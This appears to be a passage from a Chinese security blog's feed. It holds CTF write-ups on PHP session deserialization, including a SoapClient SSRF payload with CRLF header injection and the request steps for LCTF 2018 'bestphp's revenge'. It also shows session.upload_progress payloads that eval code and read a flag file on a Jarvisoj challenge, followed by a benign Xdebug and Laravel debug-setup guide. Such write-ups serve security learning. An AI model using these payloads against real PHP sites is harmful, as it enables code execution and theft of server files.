&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>爆破成功后就拿到了shell，其余跟上面一样&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>————这个栗子结合了SoapClient和session的考点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>看到了我们的老朋友&lt;code>call_user_func&lt;/code>，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；&lt;code>call_user_func&lt;/code>函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中&lt;/p>
&lt;p>内置类&lt;code>SoapClient()&lt;/code>满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用&lt;code>__call&lt;/code>&lt;/p>
&lt;p>所以整体思路是这样的：&lt;/p>
&lt;ol>
&lt;li>覆盖序列化引擎为&lt;code>php_serialize&lt;/code>， 通过&lt;code>session_start&lt;/code>将一个序列化的&lt;code>SoapClient&lt;/code>写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以&lt;/li>
&lt;li>第一个&lt;code>call_user_func&lt;/code>通过&lt;code>extract&lt;/code>变量覆盖使&lt;code>$b = call_user_func&lt;/code>，第二个&lt;code>call_user_func&lt;/code>调用&lt;code>SoapClient-&amp;gt;__call&lt;/code>（不可访问的方法 call_user_func）&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">这里是题目页面&lt;/a>；开幕源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先看看phpinfo，应该有提示信息；发现&lt;code>session.upload_progress.enabled=On&lt;/code>，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入&lt;/p>
&lt;p>序列化exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造上传表单，注意文件名的引号要加反斜杠转义&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:36:\&amp;#34;print_r(scandir(dirname(__FILE__)));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>然后访问这个php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:88:\&amp;#34;print_r(file_get_contents(\&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;#34;));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>得到flag&lt;/p>
&lt;hr>
&lt;p>呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、&lt;/p>
&lt;p>最近的计划和安排就是刷题&amp;amp;把之前的知识体系填充完整，加油啦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透&lt;/a>&lt;/p>
&lt;p>如有遗漏请指正！！！&lt;/p>
&lt;/details></description></item><item><title>PHP远程debug环境配置</title><link>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</link><pubDate>Thu, 25 Nov 2021 18:44:34 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</guid><description>&lt;p>首先，这里的情况与一般的本地调试localhost不同，是本地debug远程主机的docke内的php项目，也就是这里的laravel；可能有的人觉得多此一举，直接在本地搭建项目、运行、debug一气呵成，速度还快，何必到远程跑一通？那我只能说too young，年轻人还是要有点长远的打算（&lt;/p>
&lt;p>一切的起因是我想复现cve-2021-3129，顺便亲自动手跟一跟&amp;amp;挖一挖laravel框架反序列化的链子，结果代码审计之前先被环境配置困住了；被这个糟心的调试从周二下午折磨到周四的凌晨，几乎是把能踩的坑踩了个遍（痛苦面具），直到现在的解决方案也不能算是最优解，不过是能正常稳定的跑起来了，次优解；感谢portainer让我能轻松创建docker&lt;/p>
&lt;p>把详细的步骤记录到这篇博客里，希望可以帮助到看到的人~欢迎友好交流！&lt;/p>
&lt;hr>
&lt;p>先说下本次配置的环境整体需求吧：&lt;/p>
&lt;ul>
&lt;li>远程vps的docker(FROM php:7.4-apache): 需开放web页面端口 + ssh端口（无需挂载目录&lt;/li>
&lt;li>laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1&lt;/li>
&lt;li>本地ide: PHPStorm + 一个映射到公网ip的供调试连接使用的端口（后面会解释原因）&lt;/li>
&lt;/ul>
&lt;p>除了最后的laravel之外就都是调php的通用流程啦，让我们开始吧~&lt;/p>
&lt;h2 id="远程dockerlaravel的环境搭建">远程docker&amp;amp;laravel的环境搭建&lt;/h2>
&lt;p>以php:7.4-apache镜像作为基础进行创建，我这里用的是portainer（别问为什么不写dockerfile，问就是还在学着怎么写（一定不鸽 近期会更新到这里的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164513693.png" alt="image-20211125164513693">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt-get install -y ssh git unzip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vim /etc/ssh/sshd_config &lt;span style="color:#75715e"># 开启对应选项 比如允许root连接什么的 不用我细嗦 各位带手子们都应该懂&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pecl install xdebug
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>touch /var/log/php/xdebug_remote.log &lt;span style="color:#75715e"># 如果需要log的话要提前创建好噢&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vim /usr/local/etc/php/php.ini &lt;span style="color:#75715e"># 将下面框中内容粘到末尾即可&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">[Xdebug]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 这一项安装好之后会有提示&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">zend_extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">debug&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.client_host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">your_vps&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.client_port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.idekey&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">laravel&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.remote_handler&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dbgp&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xdebug.log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/var/log/php/xdebug_remote.log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此处安装版本为xdebug3，与xdebug2的配置语法有一些出入，具体更新的内容详见&lt;a href="https://xdebug.org/docs/upgrade_guide">更新文档&lt;/a>，安装好xdebug后执行&lt;code>php -v&lt;/code>命令会有显示版本&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164949111.png" alt="image-20211125164949111">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wget https://github.com/composer/composer/releases/download/2.1.12/composer.phar
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv composer.phar /usr/local/bin/composer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod +x /usr/local/bin/composer
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cd&lt;/span> /var/www
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>composer create-project laravel/laravel . &lt;span style="color:#d88200">&amp;#34;v8.4.2&amp;#34;&lt;/span>
